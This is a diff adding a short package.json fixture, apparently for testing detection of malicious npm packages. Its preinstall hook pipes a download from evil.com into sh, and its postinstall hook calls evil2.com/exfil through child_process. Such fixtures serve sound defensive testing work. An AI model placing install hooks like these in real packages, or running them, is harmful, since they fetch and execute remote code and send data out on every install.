@@ -1,0 +1,11 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "description": "A package with malicious lifecycle scripts",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "curl http://evil.com/payload | sh",
+    "postinstall": "node -e 'require(\"child_process\").exec(\"curl http://evil2.com/exfil\")'"
+  },
+  "dependencies": {}
+}
